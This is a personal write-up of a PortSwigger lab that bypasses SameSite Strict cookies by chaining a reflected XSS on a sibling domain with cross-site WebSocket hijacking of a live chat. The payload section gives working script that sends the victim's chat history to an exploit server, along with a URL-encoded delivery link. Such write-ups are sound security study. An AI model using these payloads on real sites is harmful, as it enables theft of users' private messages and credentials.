# [SameSite Strict bypass via sibling domain] — [PortSwigger] — [Practitioner]
**Date:** 2026-06-11
 
---
 
## Vulnerability / core concept
Cross-site Request Forgery

## What made me stuck
The solution in this lab used BurpSuite Professional which I do not have currently. Therefore, I tried to solve this lab by using built-in exploit server of PortSwigger. I faced lots of problem with URL encoding, no matter how I encoded it, it did not work. Maybe exploit server was bugging, I am still not sure. But after lots of attempts I finally made it.
 
## What unblocked me
I used caidos built-in encoding and URL copy instead of manually doing it via CyberChef.
 
---


## Attack path
1) As we can notice, this web app has live chat functionality. When loading the chat, we can inspect using proxy that it sends `READY` message to the server to retrieve the chat history. Moreover, this live chat is not protected by any csrf token, and only protected by SameSite Strict security. That means we need to find something more. (Note: I found out that live chat is vulnerabile to XSS, however, whenever you reload the chat, that payload becomes HTML encoded, so it is not really useful for us in this case.)
2) During general recon, we can notice in web proxy tool that when resources are loaded, in response we have `Access-Control-Allow-Origin` header with some new domain.
3) Upon opening this URL we can notice that we have another login, and when we try to login with invalid username, it is displayed on the page. That means we can try to exploit that page using XSS. It is important to mention that this XSS also works with GET method, so user does not have to submit any form to be affected by XSS.
4) When we enter our XSS payload, we can notice that it works. That means we can use this XSS vulnerability to send request to live chat. It works for us because request will be completed from same origin and we can bypass SameSite Strict protection by this XSS.
5) First we need to create a default payload to create new websocket connection and extract data from it (payloads are in payload section.). Then, we should put that payload into username field in new vulnerable domain, so when victim's browser opens the page, it automatically send all data of his live chat to us with his session cookie bypassing SameSite Strict protection.
6) Now all we need to do is to read extracted data from victim's chat and find his password, log in, and solve this lab.

---


## Payload / key command
Default websocket payload looks like this:
```html
<script>
var ws = new WebSocket('https://web-security-academy.net/chat');
ws.onopen = function() {
    ws.send("READY");
};
ws.onmessage=function(e){
    fetch('https://exploit-server.net/exploit?d='+btoa(e.data))
};
</script>
```
This payload established new websocket connection with vulnerable webpage, send `READY` to server to retrieve chat history and then send all that data to our exploit server.

The payload that we deliver to victim:
```html
<script>
document.location = "https://cms-0a5000d6044442478014172400490094.web-security-academy.net/login?username=%3Cscript%3Evar+ws+%3D+new+WebSocket%28%27wss%3A%2F%2F0a5000d6044442478014172400490094.web-security-academy.net%2Fchat%27%29%3B+ws.onopen+%3D+function%28%29+%7B+ws.send%28%22READY%22%29%3B+%7D%3B+ws.onmessage%3Dfunction%28e%29%7B+fetch%28%27https%3A%2F%2Fexploit-0ab100c6040d42f7805c162201eb0063.exploit-server.net%2Fexploit%3Fd%3D%27%2Bbtoa%28e.data%29%29+%7D%3B%3C%2Fscript%3E&password=babek123";
</script>
```
When user opens this page, it automatically executes our payload and sends us victim's chat history.

---


## What I'd recognize faster next time
It is very important to have a good recon of targer. Like in this lab, we can find some other vulnerable new domain and then we can use that vulnerability to chain it with another web app weakness such as absence of csrf tokens for live chat. This can lead to serious data leak of victim and company/business.

